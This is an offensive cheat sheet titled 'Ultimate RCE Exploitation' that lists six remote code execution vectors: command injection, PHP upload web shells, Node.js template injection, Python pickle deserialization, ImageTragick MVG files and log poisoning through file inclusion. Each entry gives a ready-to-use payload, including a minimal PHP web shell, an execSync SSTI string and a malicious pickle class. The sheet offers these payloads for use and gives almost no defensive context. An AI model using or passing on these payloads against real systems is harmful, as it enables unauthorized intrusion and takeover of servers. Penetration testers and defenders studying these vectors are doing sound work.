# 🛡 Ultimate RCE Exploitation – Popular Vectors  
**By CybrX1337**

---

## 📜 Table of Contents  
1. [Command Injection](#1-command-injection)  
2. [PHP File Upload & Execution](#2-php-file-upload--execution)  
3. [Node.js Template Injection](#3-nodejs-template-injection)  
4. [Python Pickle Deserialization](#4-python-pickle-deserialization)  
5. [ImageMagick “ImageTragick”](#5-imagemagick-imagetragick)  
6. [Log Poisoning to RCE](#6-log-poisoning-to-rce)

---

## 1️⃣ Command Injection  
**MIME Context:** `application/x-www-form-urlencoded`, `multipart/form-data`  
**Description:** Inject system commands into vulnerable parameters processed by `exec()`, `system()`, `shell_exec()`, `popen()`, or backticks.  
**Example:**  
`https://example.com/ping?host=127.0.0.1;id`  
`https://example.com/test?cmd=ls%20-al`

---

## 2️⃣ PHP File Upload & Execution  
**MIME Context:** `application/x-php`, `application/octet-stream`  
**Description:** Upload `.php` or `.phtml` shells bypassing extension/MIME checks, then execute them directly.  
**Example:**  
Upload file: `shell.php`  
Access shell:  
`https://example.com/uploads/shell.php?cmd=id`  
Minimal PHP shell:  
```php
<?php system($_GET['cmd']); ?>

---

## 3️⃣ Node.js Template Injection  
**MIME Context:** `application/json`, `application/x-www-form-urlencoded`  
**Description:** SSTI in templating engines like EJS, Pug, or Handlebars allows execution of arbitrary JS/OS commands.  
**Example:**  
`https://example.com/profile?name=<%= global.process.mainModule.require('child_process').execSync('id') %>`

---

## 4️⃣ Python Pickle Deserialization  
**MIME Context:** `application/octet-stream`, `application/python-pickle`  
**Description:** Untrusted pickle data deserialized on the server can execute arbitrary Python code.  
**Example:**  
Upload crafted pickle to `https://example.com/api/upload`  
Python malicious pickle snippet:  
```python
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
print(pickle.dumps(RCE()))

---

## 5️⃣ ImageMagick “ImageTragick”  
**MIME Context:** `image/svg+xml`, `image/mvg`  
**Description:** Malicious image files exploiting ImageMagick's delegate feature to execute commands.  
**Example:**  
Upload file `exploit.mvg` containing:  
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com"|ls "-al")'
pop graphic-context

---

## 6️⃣ Log Poisoning to RCE  
**MIME Context:** `text/plain`, `text/html`  
**Description:** Inject PHP code into server logs (access.log/error.log), then request the log file through LFI to execute.  
**Example:**  
Poison logs by setting User-Agent header to:  
```php
<?php system($_GET['cmd']); ?>
Access poisoned log:
https://example.com/index.php?page=/var/log/apache2/access.log&cmd=id
